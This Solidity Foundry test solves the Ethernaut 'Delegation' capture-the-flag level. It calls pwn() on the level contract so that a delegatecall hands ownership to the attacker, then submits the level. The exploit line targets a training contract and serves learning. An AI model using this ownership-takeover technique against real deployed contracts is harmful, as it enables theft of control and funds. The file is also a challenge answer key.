pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/levels/Delegation/DelegationFactory.sol";
import "../src/core/Ethernaut.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testDelegationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}